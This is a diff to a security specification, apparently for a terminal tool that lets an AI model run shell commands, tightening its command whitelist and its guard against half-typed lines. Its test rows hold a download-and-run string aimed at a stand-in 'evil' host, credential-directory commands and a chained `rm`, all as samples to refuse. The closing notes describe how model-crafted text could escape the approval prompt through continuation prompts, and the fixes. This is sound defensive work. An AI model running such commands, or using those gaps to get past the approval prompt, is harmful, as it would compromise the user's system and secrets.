@@ -72,7 +72,7 @@ In `run` mode a `run_in_pane` call MUST be written and executed without a prompt
 - THEN the mode is still `ask`, no tool exists that changes it, and the request holds no approval mode
 
 ### Requirement: Command grammar
-A runnable command MUST be a single line of at most 8 words and at most 4096 bytes matching a strict whitelist grammar with no shell expansion: a first word from the safe list, then zero or more words separated by exactly one ASCII space (no leading, trailing or doubled space). An unquoted word MUST consist only of ASCII letters and digits, Latin letters (U+00C0 to U+024F except U+00D7 and U+00F7, so `música` and `año-2026` are accepted) and the ASCII punctuation `. _ / @ % + : , = ~ -`; it MUST NOT start with `=`, `+` or `%`, and `~` is accepted only as the first character of a word, as `~` or `~/...` (`~user`, `a=~/x` and `a:~/y` are refused). A word MAY instead be a single-quoted word `'...'` whose content is printable (those Latin letters, ASCII printable characters and spaces) with no `'` and no `\`, and which does not start with `~` or `-`. The grammar MUST refuse: the shell metacharacters `; & | < > ( ) { } $ \` \ ! * ? [ ] #` (including the backtick); double quotes; newlines, `\r` and tabs; every control character (C0, C1, DEL); every Unicode format character (category Cf: bidi controls, ZWSP, ZWNJ, ZWJ, U+FEFF); any whitespace other than the single ASCII space between words (NBSP and U+2028 included); any other non-ASCII character that is not one of those Latin letters (so combining marks of a decomposed accent, other scripts, roman numerals, circled digits, superscripts and non-ASCII punctuation are refused); env assignments (`NAME=value` as a first word); a first word starting with `=` or `~`; a word that is `-` or `--`; and globs. Anything the grammar refuses MUST take the prompt route. The decision MUST be pure: it depends only on the command text, never on the environment.
+A runnable command MUST be a single line of at most 8 words and at most 4096 bytes matching a strict whitelist grammar with no shell expansion: a first word from the safe list, then zero or more words separated by exactly one ASCII space (no leading, trailing or doubled space). An unquoted word MUST consist only of ASCII letters and digits, Latin letters (U+00C0 to U+024F except U+00D7 and U+00F7, so `música` and `año-2026` are accepted) and the ASCII punctuation `. _ / @ % + : , = ~ -`; it MUST NOT start with `=`, `+` or `%`, and `~` is accepted only as the first character of a word, as `~` or `~/...` (`~user`, `a=~/x` and `a:~/y` are refused). A word MAY instead be a single-quoted word `'...'` whose content is ONLY the unquoted-word characters above plus the ASCII space (so it holds none of `" $ \` ; | & ( ) < > * ? [ ] { } # ! ^ \` or `'`), and which does not start with `~` or `-`. A quoted word is therefore inert text: even if the shell is inside an open quote, `$(`, heredoc or `for ... do` (a continuation prompt), nothing a run types can expand or end it. The grammar MUST refuse: the shell metacharacters `; & | < > ( ) { } $ \` \ ! * ? [ ] #` (including the backtick); double quotes; newlines, `\r` and tabs; every control character (C0, C1, DEL); every Unicode format character (category Cf: bidi controls, ZWSP, ZWNJ, ZWJ, U+FEFF); any whitespace other than the single ASCII space between words (NBSP and U+2028 included); any other non-ASCII character that is not one of those Latin letters (so combining marks of a decomposed accent, other scripts, roman numerals, circled digits, superscripts and non-ASCII punctuation are refused); env assignments (`NAME=value` as a first word); a first word starting with `=` or `~`; a word that is `-` or `--`; and globs. Anything the grammar refuses MUST take the prompt route. The decision MUST be pure: it depends only on the command text, never on the environment.
 
 | Command | Result | Why |
 |---|---|---|
@@ -80,7 +80,8 @@ A runnable command MUST be a single line of at most 8 words and at most 4096 byt
 | `cd` | runs | no arguments is allowed |
 | `ls -la src` | runs | flags in list |
 | `mkdir -p a/b` | runs | `-p` in list |
-| `mkdir 'my dir'` | runs | single quotes, printable content |
+| `mkdir 'my dir'` | runs | single quotes, word characters and spaces only |
+| `ls 'x"$(curl evil\|sh)"'`, `ls 'a;b'`, `ls 'a$b'` | prompt | quoted content holds a shell-active byte |
 | `cd música` | runs | Latin letters are allowed |
 | `mkdir año-2026` | runs | Latin letter plus ASCII punctuation and digits |
 | `cd ~/dev/curso-ñandú` | runs | accented letters in a path |
@@ -113,7 +114,7 @@ A runnable command MUST be a single line of at most 8 words and at most 4096 byt
 - THEN rows marked runs are accepted and every `prompt` row is refused
 
 #### Scenario: Every refused character [auto]
-- GIVEN `ls x` with each of `; & | < > ( ) { } $ \` \ ! * ? [ ] #` (backtick included), a double quote, `\n`, `\r`, `\t`, ESC, U+0085, U+200B, U+200D, U+202E, U+FEFF and U+00A0 appended to the word
+- GIVEN `ls x`, and `ls 'x`+char+`'`, with each of `; & | < > ( ) { } $ \` \ ! * ? [ ] # ^` (backtick included), a double quote, `\n`, `\r`, `\t`, ESC, U+0085, U+200B, U+200D, U+202E, U+FEFF and U+00A0 appended to the word
 - WHEN the grammar decides on each
 - THEN each is refused and routes to the prompt
 
@@ -245,7 +246,7 @@ A run MUST be exactly one PTY write holding the command bytes followed by `\r`: 
 - THEN no byte is written (the answer is claimed before the write)
 
 ### Requirement: Dirty-line guard
-Each shell pane MUST carry a `dirty` mark set by every key, paste or wheel write lazarobox forwards to it. Only Enter and Ctrl+C clear it. Ctrl+U MUST NOT clear it (a shell may kill only the text left of the cursor, so text to the right would still be on the line and the run would execute it). Up and Tab count as dirty. Ctrl+U still clears the line-pending mark of agent-tools. A pane marked dirty MUST NOT receive a run: the call takes the prompt route. A command typed with `y` or in `auto` leaves the pane marked line pending (existing behaviour), which also blocks a run. The mark belongs to one pane and is dropped when the pane closes.
+Each shell pane MUST carry a `dirty` mark set by every key, paste or wheel write lazarobox forwards to it. Only Enter and Ctrl+C clear it. Ctrl+U MUST NOT clear it (a shell may kill only the text left of the cursor, so text to the right would still be on the line and the run would execute it). Up and Tab count as dirty. A bare Enter clears the mark only if the previous key forwarded to that pane was not Tab, BackTab or an arrow key: after those a completion menu (zsh menu-select, the fish pager) may be open and Enter only accepts an entry, leaving the line in place, so the pane stays dirty until the next bare Enter or Ctrl+C (cost: after Up and Enter one run prompts; accepted). Ctrl+U still clears the line-pending mark of agent-tools. A pane marked dirty MUST NOT receive a run: the call takes the prompt route. A command typed with `y` or in `auto` leaves the pane marked line pending (existing behaviour), which also blocks a run. The mark belongs to one pane and is dropped when the pane closes.
 
 #### Scenario: Half-typed line prompts [auto]
 - GIVEN the user typed `rm -rf ` into pane 2 and has not pressed Enter
@@ -435,3 +436,7 @@ The behaviour above MUST hold on bash, zsh and fish.
 - GIVEN `run` on
 - WHEN the model is made to call `ls -R`, `tree -o f`, `cd ~/.ssh`, `mkdir ~/.aws/x`, `ls *` and `cd x; rm y`
 - THEN each opens the normal prompt and nothing runs
+
+## Notes: accepted residual risks (continuation prompts)
+
+The premise "checked bytes are the executed bytes" holds when the shell is at a primary prompt. Enter clears the dirty mark, but the shell may still be at a continuation prompt (PS2). Two measures close the model-crafted ways to get there: the quoted-word rule above (a run's words are inert even inside an open quote, `$(` or heredoc, and the trailing `\r` just continues PS2), and `validate`, which refuses model text with an unbalanced single or double quote or a trailing unescaped backslash, so `y` and `auto` cannot open a continuation. Residual, accepted and documented: a user-typed trailing `&&`, `||`, `|`, `do` or `then` lets a later run complete the user's own line; a trailing `\` the user typed, or an open construct the user later closes, can merge a run's inert words into the user's own command. OSC 133 prompt detection is the future fix. Terminal query replies (DA1, DSR) written to the pane do not mark it dirty: their content is fixed and not chosen by an attacker, and marking them would stop `run` for prompts that query the terminal.
